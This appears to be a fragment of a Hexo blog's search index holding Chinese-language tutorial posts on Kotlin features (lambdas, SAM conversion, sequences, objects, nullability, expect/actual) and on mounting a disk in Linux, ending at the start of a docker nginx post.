class="operator">=</span> &#123; a: Int, b: Int -&gt; a+b&#125;</span><br><span class="line">fun <span class="title function_">add</span><span class="params">(a:Int,b:Int)</span>:(Int,Int)-&gt;(Int)=&#123; a: Int, b: Int -&gt; a+b&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>kotlin高阶函数<br>一个函数如果参数类型是函数或者返回值类型是函数，那么这就是一个高阶函数。<br><strong>函数类型其实就是将函数的 “参数类型” 和 “返回值类型” 抽象出来</strong><br>例如:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">add</span><span class="params">()</span>:(Int,Int)-&gt;(Int)=&#123; a: Int, b: Int -&gt; a+b&#125;</span><br></pre></td></tr></table></figure>
<p>这里表示他的返回类型为<code>(Int,Int)-&gt;(Int)</code></p>
</li>
<li><p>Lambda表达式<br>同样的在lambda表达式中,他的函数体也只有一个表达式。<br>他是定义匿名函数的简单形式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">sum</span> <span class="operator">=</span> &#123;x:Int,y:Int -&gt; x+y&#125;</span><br></pre></td></tr></table></figure>
<p>其中，参数声明放在-&gt;前面，函数体放在-&gt;后面<br>还可以将可选标注先留下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">val sum:(Int,Int)-&gt;Int = &#123;x,y-&gt;x+y&#125;</span><br></pre></td></tr></table></figure>
<p>在kotlin中，如果一个函数的最后一个参数是lambda表达式，那么可以直接将表达式写在括号外面。<br>如果只有一个参数，那么直接省略小括号。</p>
</li>
<li><p>特殊符号</p>
</li>
</ol>
<p><code>?</code>表示  是否允许空值的存在<br><code>!!</code>表示  如果对象为null，那么系统一定会报异常！<br><code>?:</code>表示  对象A ?: 对象B 表达式，意思为，当对象 A值为 null 时，那么它就会返回后面的对象 B。<br><code>::</code>表示  Kotlin 中 双冒号操作符 表示把一个方法当做一个参数，传递到另一个方法中进行使用，通俗的来讲就是引用一个方法。<br><code>-&gt;</code>表示 一般用于函数类型的连接符号<br><code>===</code>和<code>==</code>的区别 在Kotlin中，&#x3D;&#x3D;&#x3D; 表示比较对象地址，&#x3D;&#x3D; 表示比较两个值大小。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin（Java函数式API的使用）</title>
    <url>/posts/c7d683d3/</url>
    <content><![CDATA[<h2 id="Java函数式API的使用"><a href="#Java函数式API的使用" class="headerlink" title="Java函数式API的使用"></a>Java函数式API的使用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OnClickListener</span>&#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种接口被称为函数式接口，或者 SAM 接口， SAM 代表单抽象方法。</p>
<h3 id="使用函数式接口的前体"><a href="#使用函数式接口的前体" class="headerlink" title="使用函数式接口的前体"></a>使用函数式接口的前体</h3><p><em>这里的前提是，使用kotlin去调用java方法，而且java方法是个单抽象接口方法，就可以直接使用函数式API</em>。<br>已知在kotlin中，有很多简单快捷的函数式API操作。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val list = listOf(&quot;Apple&quot;,&quot;Banana&quot;,&quot;Orange&quot;,&quot;Grape&quot;,&quot;Watermelon&quot;)</span><br><span class="line">val maxLengthFruit = list.maxBy&#123;it.length&#125;</span><br><span class="line">println(maxLengthFruit)</span><br></pre></td></tr></table></figure>
<p>而这个的前提就是kotlin中可以将函数作为一个参数传递出去。同样也可以使用lambda来简写函数式。<br>我们在这里说的是，如果JAVA是一个单抽象接口方法，我们在kotlin中调用该方法时，也可以很简单的去编写，例如下面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这是一个Android中常用的点击事件窗口。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OnClickListener</span>&#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果通过JAVA的方式编写</span></span><br><span class="line"><span class="comment">//在以下函数中，View中的一个内部接口OnClickListener被当场实现。并且重写方法</span></span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View w)</span>&#123;</span><br><span class="line">	<span class="comment">//方法体</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//而通过kotlin调用JAVA的话</span></span><br><span class="line">button.setOnClickListener&#123;</span><br><span class="line">	<span class="comment">//方法体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>可能你会疑惑，既然使用了kotin那么调用java应该不常用吧，但实际并不是这样，kotlin的核心之一就是与java的互操性，它可以在几乎所有地方，平等的替代java，因此也可以使用java巨大的生态库，这样使用java的函数式API的机会就会有很多。</p>
<blockquote>
<p>！！！只有在kotlin调用java时才可以使用</p>
</blockquote>
<h2 id="详解函数式接口在kotlin中的使用"><a href="#详解函数式接口在kotlin中的使用" class="headerlink" title="详解函数式接口在kotlin中的使用"></a>详解函数式接口在kotlin中的使用</h2><p>在java中的期望函数式接口的方法可以接受一个lambda函数作为实参。<br>同样能达到该效果的还可以用object显示继承该接口，并重写他的方法。</p>
<h4 id="但是如果用object显示创建的话，他会每一次都创建一个使用新实例对象。而如果使用lambda的话，如果该lambda函数没有访问任何定义他的函数的局部变量，也就是没有访问外部变量，那么这个lambda函数就是可以在多次调用中重用的。"><a href="#但是如果用object显示创建的话，他会每一次都创建一个使用新实例对象。而如果使用lambda的话，如果该lambda函数没有访问任何定义他的函数的局部变量，也就是没有访问外部变量，那么这个lambda函数就是可以在多次调用中重用的。" class="headerlink" title="但是如果用object显示创建的话，他会每一次都创建一个使用新实例对象。而如果使用lambda的话，如果该lambda函数没有访问任何定义他的函数的局部变量，也就是没有访问外部变量，那么这个lambda函数就是可以在多次调用中重用的。"></a>但是如果用object显示创建的话，他会每一次都创建一个使用新实例对象。而如果使用lambda的话，如果该lambda函数没有访问任何定义他的函数的局部变量，也就是没有访问外部变量，那么这个lambda函数就是可以在多次调用中重用的。</h4><p>如果他访问了外部变量，那么每次也会去创建一个新实例作为参数传递进去。<br><strong>使用lambda函数是因为他在底层为你完善了这个SAM实例。</strong><br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88Java%E5%87%BD%E6%95%B0%E5%BC%8FAPI%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89-2023-07-05-35-29.png"></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin（序列）</title>
    <url>/posts/58cbed9c/</url>
    <content><![CDATA[<h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><p>引出序列的使用，首先当我们在使用集合的各种便携式API函数时，他会创建一个中间列表，最后返回。这在使用中并没有什么问题，但是如果采用了链式的多个函数操作，以及集合的基数很大时就会导致效率低下。<br>例如这个，他会在中途生成两个列表，如果基数很大将会变得非常低效。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">people.map(Person: :name) .filter &#123; it.startsWith （<span class="string">&quot;A&quot;</span>）｝</span><br></pre></td></tr></table></figure>
<p>而序列就是一种惰性集合，他一样可以使用集合所有的api方法，但是他不会在中间创造集合存储，而是类似java中的流。他是一个迭代器的形式，每个元素每个元素的遍历，然后最后在生成结果，如果没有最后的生成结果的步骤，他不会进行之前的操作。<br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E5%BA%8F%E5%88%97%EF%BC%89-2023-07-07-37-58.png"></p>
<h3 id="Sequence接口"><a href="#Sequence接口" class="headerlink" title="Sequence接口"></a>Sequence接口</h3><p>惰性集合的接口就是Sequence接口，而且他只提供了一个方法，也就是iterator。<br>因为Sequence是惰性的，所以他可以很高效的对集合元素执行链式操作，而且不会产生额外的中间集合。</p>
<h2 id="序列操作"><a href="#序列操作" class="headerlink" title="序列操作"></a>序列操作</h2><p><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E5%BA%8F%E5%88%97%EF%BC%89-2023-07-04-19-01.png"><br>序列操作有两种，一种中间操作，他返回的任然是序列，一种是末端操作，他返回的结果，可以是任何所需要的对象。<br><strong>中间操作始终是惰性的</strong> ，也就是意味着，在链式操作中。如果是一般的集合，那么他们会先把所有元素都进行第一次中间操作，得到一个新集合，再进行第二次中间操作。而这就会带来内存的消耗。如果是惰性集合即序列时，他会按顺序把每个元素进行完所有的中间操作，然后返回。接下来再执行第二个元素。依次递进。<br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E5%BA%8F%E5%88%97%EF%BC%89-2023-07-13-26-24.png"></p>
<p>而且即便都是序列，不同的执行顺序也会有不同的性能开销。<br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E5%BA%8F%E5%88%97%EF%BC%89-2023-07-07-24-45.png"></p>
<h2 id="生成Sequence"><a href="#生成Sequence" class="headerlink" title="生成Sequence"></a>生成Sequence</h2><p>第一种生成Sequence的方式就是通过集合的asSequence()方法，第二种就是调用generateSequence()，给定序列的前一个元素，他就会根据函数推导出第二个函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">val</span> <span class="variable">testSequence</span> <span class="operator">=</span> generateSequence(<span class="number">1</span>)&#123;it*<span class="number">2</span>&#125;</span><br><span class="line">    <span class="type">val</span> <span class="variable">result</span> <span class="operator">=</span> testSequence.takeWhile &#123; it&lt;=<span class="number">1024</span> &#125;</span><br><span class="line">    <span class="comment">//延期操作</span></span><br><span class="line">    println(result.sum())</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//迭代器的使用</span></span><br><span class="line">    <span class="type">var</span> <span class="variable">a</span> <span class="operator">=</span> result.iterator()</span><br><span class="line">    <span class="keyword">for</span>(i in a)&#123;</span><br><span class="line">        println(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下：<br>需要注意的是<code>testSequence</code>和<code>result</code>都是延期操作的序列，只有实际被调用，使用后才会进行求值。<br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E5%BA%8F%E5%88%97%EF%BC%89-2023-07-04-13-36.png"></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin（object)</title>
    <url>/posts/5eb8f30/</url>
    <content><![CDATA[<h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><p>在kotlin中，可以非常简单的通过这个关键词实现一个单例类。他可以实现接口，继承类，也可以用扩展方法去扩展类。<br>他就是一个非常完美的类的声明方法。</p>
<blockquote>
<p>当然，同理的作为一个单例类，他并没有构造方法，也就是如果你使用<code>constructor</code>将会直接导致报错。</p>
</blockquote>
<p>如果在java中要调用kotlin中的object对象，他需要通过一个字段<code>INSTANCE</code>来实现，具体实例如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//kotlin</span></span><br><span class="line">open <span class="keyword">class</span> <span class="title class_">Student</span>:Child&#123;</span><br><span class="line">    fun <span class="title function_">call</span><span class="params">()</span>&#123;</span><br><span class="line">        println(<span class="string">&quot;我会叫&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">object child1:Student()&#123;</span><br><span class="line">    val name=<span class="string">&quot;abc&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        child1.INSTANCE.walk();</span><br><span class="line">        System.out.println(child1.INSTANCE.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后实现结果为<img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88object">-2023-07-12-09-18.png)<br>乱码暂时不晓得怎么解决。</p>
<h2 id="伴生对象"><a href="#伴生对象" class="headerlink" title="伴生对象"></a>伴生对象</h2><p>kotlin并没有静态方法的称谓。所以使用伴生对象。他在大多数情况下可以用来代替java中的static方法。<br>虽然推荐静态方法使用顶层函数，因为他在编译后会直接编译为static类型。但是某些时候不允许这样操作，比如一个类中的私有类无法通过顶层函数访问到。<br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88object">-2023-07-14-42-18.png)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    companion object&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">filed</span> <span class="operator">=</span> <span class="string">&quot;字母&quot;</span></span><br><span class="line">        fun <span class="title function_">call</span><span class="params">()</span>&#123;</span><br><span class="line">            print(filed)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>声明伴生对象需要使用<code>companion</code>的关键字，他被声明后，可以通过类名直接使用伴生对象中的方法和属性，而不用创建实例。也可以通过类名调用<code>Companion</code>伴生对象然后实现。本质是一样的，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">A.call()</span><br><span class="line">A.Companion.call()</span><br></pre></td></tr></table></figure>
<p>他们实际是一样的操作。</p>
<h4 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h4><p>工厂模式下，会将类的构造器私有化，不允许通过构造器去实现创造实例。而是通过在伴生对象中，通过定义不同含义名字的各种方法，来实现生成实例类。<br><strong>而且伴生对象不能被继承和重写。</strong></p>
<p>作为一个普通对象的伴生对象，他甚至还可以定义伴生对象的名字，就像实现单例类那用。然后可以通过他的类名和他的伴生对象名去调用这个伴生对象。</p>
<blockquote>
<p>如果要使用java去调用kotlin中的伴生类，一定需要通过他的默认名称<code>Companion</code>或者伴生对象名去调用该方法。 或者使用注解<code>@JvmStatic</code>将方法声明为静态方法，用<code>@JvmFiele</code>将属性声明为静态属性。这样的话，java可以直接调用，而不用先调用该伴生对象。</p>
</blockquote>
<h4 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h4><p>使用object作为匿名内部类，很好理解。就不再多言。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>linux下硬盘挂载和分区</title>
    <url>/posts/acfcb58e/</url>
    <content><![CDATA[<h2 id="初始化硬盘并挂载"><a href="#初始化硬盘并挂载" class="headerlink" title="初始化硬盘并挂载"></a>初始化硬盘并挂载</h2><ol>
<li><p>执行<code>fdisk -l</code>查看硬盘信息<br><img src="https://image.zfxt.top/hexo-blog/linux%E4%B8%8B%E7%A1%AC%E7%9B%98%E6%8C%82%E8%BD%BD%E5%92%8C%E5%88%86%E5%8C%BA-2024-07-02-12-01-18.png" alt="linux下硬盘挂载和分区-2024-07-02-12-01-18"></p>
</li>
<li><p>执行以下命令，对 &#x2F;dev&#x2F;vdb 裸设备直接创建文件系统格式。<br><code>mkfs -t &lt;文件系统格式&gt; /dev/vdb</code></p>
</li>
<li><p>不同文件系统支持的分区大小不同，请根据实际需求合理选择文件系统。以设置文件系统为 EXT4 为<br><code>mkfs -t ext4 /dev/vdb</code></p>
</li>
<li><p>执行以下命令，新建挂载点。<br><code>mkdir &lt;挂载点&gt;</code><br> 以新建挂载点 &#x2F;data 为例：<code>mkdir /data</code></p>
</li>
<li><p>执行以下命令，将新建分区挂载至新建的挂载点。<br><code>mount /dev/vdb &lt;挂载点&gt;</code></p>
</li>
<li><p>以新建挂载点 &#x2F;data 为例：<br><code>mount /dev/vdb /data</code></p>
</li>
<li><p>执行以下命令，查看挂载结果。<br><code>df -TH</code></p>
</li>
</ol>
<h2 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h2><ol>
<li><p>执行以下命令，查看文件系统的 UUID。<br><code>blkid /dev/vdb</code></p>
</li>
<li><p>执行以下命令，使用 VI 编辑器打开 <code>/etc/fstab</code> 文件。<br><code>vi /etc/fstab</code></p>
</li>
<li><p>在 <code>/etc/fstab</code> 文件中添加以下内容。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;设备信息&gt; &lt;挂载点&gt; &lt;文件系统格式&gt; &lt;文件系统安装选项&gt; &lt;文件系统转储频率&gt; &lt;启动时的文件系统检查顺序&gt;</span><br></pre></td></tr></table></figure>

<p> 以使用磁盘分区的 UUID 自动挂载为例，结合前文示例则添加：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UUID=d489ca1c-5057-4536-81cb-ceb2847f9954 /data  ext4 defaults     0   0</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>硬盘</tag>
      </tags>
  </entry>
  <entry>
    <title>kotlin（类型系统）</title>
    <url>/posts/39b5aa7e/</url>
    <content><![CDATA[<h1 id="可空性"><a href="#可空性" class="headerlink" title="可空性"></a>可空性</h1><blockquote>
<p>在java中，运行一个程序，往往遇到的最多的错误就是空指针异常，而空指针异常他是个运行时异常，往往不会指明究竟是哪一行的问题，这就让程序员非常的头疼。</p>
</blockquote>
<p>而kotlin的解决方案就是把运行时错误转为编译期的错误。让程序员可以在编译时就减少错误异常的产生。通过区分可空和非空两种数据类型。</p>
<h3 id="可空类型"><a href="#可空类型" class="headerlink" title="可空类型"></a>可空类型</h3><p>在kotlin中，所有的常见类型都是默认<strong>非空</strong>的，也就是不能接受<code>null</code>作为参数。除非显示的把他标记为可空，即在类型后面加上<code>?</code>。<br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%EF%BC%89-2023-07-02-35-23.png"><br>但是，一旦声明了是可控类型，就会有很多操作受到限制，kotlin会直接拒接一部分函数的调用，除非你对他进行了非空判断处理，然后kotlin系统就会只能判断类别，然后你才能继续执行。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">strLen</span><span class="params">(s:String?)</span> = <span class="keyword">if</span>(s!=<span class="literal">null</span>) s.length <span class="keyword">else</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>如果你不进行非空判断，他将不允许进行编译。</p>
<h3 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h3><blockquote>
<p>类型就是数据的分类……决定了该类型可能的值，以及该类型的值上可以完成的操作。</p>
</blockquote>
<p>在java中，他没有区分可空和非空，例如<code>String</code>类型可以接受<code>String</code>类型和<code>null</code>。而这在运行中就有可能导致空指针异常（NullPointerException）。而如果每次调用前都进行一次非空判断，就会大大降低代码的可读性。致使代码臃肿。</p>
<blockquote>
<p>java中也提供了@Nullable和@NotNull的注解用来判断能否处理空值。或者直接使用Optional的一种包装类，用来确保没有null，但是这会导致代码变得冗余，额外的包装类还会影响运行时的性能。</p>
</blockquote>
<p><strong>Kotlin的可空类型提供了全面的解决方案。区分可空和非空类型使判断变得简单。</strong></p>
<h2 id="安全调用运算符：？"><a href="#安全调用运算符：？" class="headerlink" title="安全调用运算符：？."></a>安全调用运算符：<code>？.</code></h2><p>kotlin工具库中最有效的一种工具就是安全调用运算符：?.<br>他允许你把一次null检查和一次方法调用合并成一个操作。<br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%EF%BC%89-2023-07-08-03-49.png"></p>
<p>不只是可以调用方法，调用属性也是一样的，可以把检查过程和方法调用一起执行。</p>
<h2 id="Elvs运算符：”-“"><a href="#Elvs运算符：”-“" class="headerlink" title="Elvs运算符：” ?: “"></a>Elvs运算符：” ?: “</h2><p>他可以方便的提供代替null的默认值，被称为Elvs运算符。<br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%EF%BC%89-2023-07-12-17-25.png"><br>他常常和安全调用运算符一起使用，用一个值代替对null对象调用方法时返回的null。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">strLen</span><span class="params">(s:String?)</span> = s?.length ?: <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>Elvs的特殊用处，return和throw都是表达式，也就是说Elvs运算符也可以接return和throw。那么如果左边判断出为空，可以直接返回或者抛出异常。这个使用情况总是特别有用。</p>
<h2 id="安全转化：”-as-“"><a href="#安全转化：”-as-“" class="headerlink" title="安全转化：” as? “"></a>安全转化：” as? “</h2><p><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%EF%BC%89-2023-07-12-49-53.png"><br>这个也很好理解，as就和类型转化符，如果检测到类型不匹配，将会返回一个空值。他也经常和Evls运算符一起使用。比如，重写Equals方法时：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    override fun <span class="title function_">equals</span><span class="params">(o:Any?)</span>:Boolean&#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">other</span> <span class="operator">=</span> o as? Person ?: <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="非空断言：”-“"><a href="#非空断言：”-“" class="headerlink" title="非空断言：” !! “"></a>非空断言：” !! “</h2><p>就是强制确保该类型一定不是null，尽管他是可空类型。如果他是null的话，将会抛出一个异常表明这个断言出现了问题，但是kotlin与java不一样的就是他会表明具体那个位置出现了问题，而不是单纯的报一个空指针异常。<br>通常不建议使用非空断言，因为他会凌驾于编译器之上，无法替你解决空值问题。</p>
<h2 id="let函数"><a href="#let函数" class="headerlink" title="let函数"></a>let函数</h2><p>let函数本身没什么特点，他的作用是把一个调用他的对象变成lambda表达式的参数。但是如果结合安全调用运算符一起使用的话，<br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%EF%BC%89-2023-07-19-52-27.png"><br>他就可以很好的解决在预判非空后实现内容。<br>而且如果一个表达式会返回一个对象，一般需要将该对象用一个变量存储，然后再使用该变量进行非空判断再执行操作。而let可以直接把这个表达式的对象进行非空判断后传入到lambda函数中作为参数使用。减少了内存的消耗。</p>
<h2 id="延迟初始化的属性"><a href="#延迟初始化的属性" class="headerlink" title="延迟初始化的属性"></a>延迟初始化的属性</h2><p>他的作用场景就是，一个变量最终一定是非空的，但是在初始化化时，不知道给他传入什么非空值。而如果传入null，将会导致后期大量的非空判断处理。影响效率。<br>因此可以延迟初始化。他常常与一些框架中的依赖注入相互配合使用。为了保证框架的兼容性，kotlin会默认生成一个lateinit的属性的具有相同可见性的字段。</p>
<h2 id="可空类型的扩展"><a href="#可空类型的扩展" class="headerlink" title="可空类型的扩展"></a>可空类型的扩展</h2><p><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%EF%BC%89-2023-07-14-45-44.png"><br>对于可空类型数据的扩展函数。<br>可以不通过安全检测就直接调用，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun String?. isNullOrBlank () : Boolean = </span><br><span class="line"><span class="built_in">this</span> == <span class="literal">null</span> <span class="number">11</span> <span class="built_in">this</span>.isBlank ()</span><br></pre></td></tr></table></figure>
<ol>
<li>泛型类和泛型函数都是默认可空的，他们都允许null的存在，即使<code>T</code>没有用？结尾，如果要限制非空，需要让泛型继承自Any，即非空泛型。</li>
</ol>
<h2 id="可空性和java"><a href="#可空性和java" class="headerlink" title="可空性和java"></a>可空性和java</h2><p><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%EF%BC%89-2023-07-19-05-46.png"><br>在java中可以通过注解实现和kotlin类似的效果。并且可以和kotlin的非空与空相互编译成功。</p>
<blockquote>
<p>因为<img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%EF%BC%89-2023-07-09-10-45.png"></p>
</blockquote>
<p>平台类型本质上就是kotlin无法判断的可空性的类型。<img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%EF%BC%89-2023-07-10-20-52.png"><br>他即可当作可空又可当作非可空<br>通过kotlin调用java时，一样需要满足相关的安全性判断，否则可能会抛出参数异常的报错<br><img src="https://image.zfxt.top/hexo-blog/kotlin%EF%BC%88%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F%EF%BC%89-2023-07-10-32-17.png"><br>kotlin可以根据平台类型去多种方式的执行，继承相关的java代码。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin默认参数没在源代码中定义</title>
    <url>/posts/ab0b4c11/</url>
    <content><![CDATA[<p>在使用kotlin协程时，突然发现一个无法理解的语法。<br><img src="https://image.zfxt.top/hexo-blog/kotlin%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0%E6%B2%A1%E5%9C%A8%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%AE%9A%E4%B9%89-2023-08-20-27-25.png"><br>在下图中，是<code>runBlocking</code>的源代码<br><img src="https://image.zfxt.top/hexo-blog/kotlin%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0%E6%B2%A1%E5%9C%A8%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%AE%9A%E4%B9%89-2023-08-23-18-12.png"><br>可以发现，他需要接受两个参数，第一个是context，第二个则是我们自己的lambda函数。<br>而实际上，我们并没用传入第一个参数进去，他却可以正常的运行而不报错。他也并没有默认的参数。</p>
<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>首先我们要理解的是kotlin是个多平台支持的语言。因此他在实现某些功能时，需要兼容win，linux，java等多平台。<br>例如：我们正在使用的协程库，肯定是一个多平台库。</p>
<h3 id="expect-actual"><a href="#expect-actual" class="headerlink" title="expect actual"></a>expect actual</h3><p>Kotlin中的expect和actual是一对关键字，用于实现跨平台的编程，特别是在编写多平台库（Commons Kt）时。在这种情况下，我们需要在一个公共的Kotlin文件中定义接口和类，而实现则需要针对不同的平台进行特殊处理，因为不同平台的操作系统和硬件配置有所不同。</p>
<p>expect和actual关键字是为了解决这种情况而设计的。expect用于声明一个接口或类，以及其所需要的属性和方法；而actual则用于提供这个接口或类的实际实现。这种技术可以让我们以一种抽象的方式编写代码，而不用关心它在不同平台上的实现细节。</p>
<p>例如，在Commons Kt中，我们可能需要实现一个网络请求的框架。在这种情况下，我们可以使用expect来定义一个接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">expect <span class="keyword">interface</span> <span class="title class_">HttpClient</span> &#123;</span><br><span class="line">    fun <span class="title function_">get</span><span class="params">(url: String)</span>: String</span><br><span class="line">    fun <span class="title function_">post</span><span class="params">(url: String, data: String)</span>: String</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来，在各个平台的特定实现中，我们可以使用actual关键字提供具体的实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">actual <span class="keyword">class</span> <span class="title class_">HttpClientImpl</span> : HttpClient &#123;</span><br><span class="line">    override fun <span class="title function_">get</span><span class="params">(url: String)</span>: String &#123;</span><br><span class="line">        <span class="comment">// 在Android平台上使用OkHttp来实现</span></span><br><span class="line">        <span class="comment">// 在iOS平台上使用NSURLSession来实现</span></span><br><span class="line">    &#125;</span><br><span class="line">    override fun <span class="title function_">post</span><span class="params">(url: String, data: String)</span>: String &#123;</span><br><span class="line">        <span class="comment">// 实现与get()方法类似</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>expect actual</tag>
      </tags>
  </entry>
  <entry>
    <title>linux使用docker部署nginx</title>
    <url>/posts/277595ec/</url>
    <content><![CDATA[<h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><p><code>docker pull nginx</code></p>
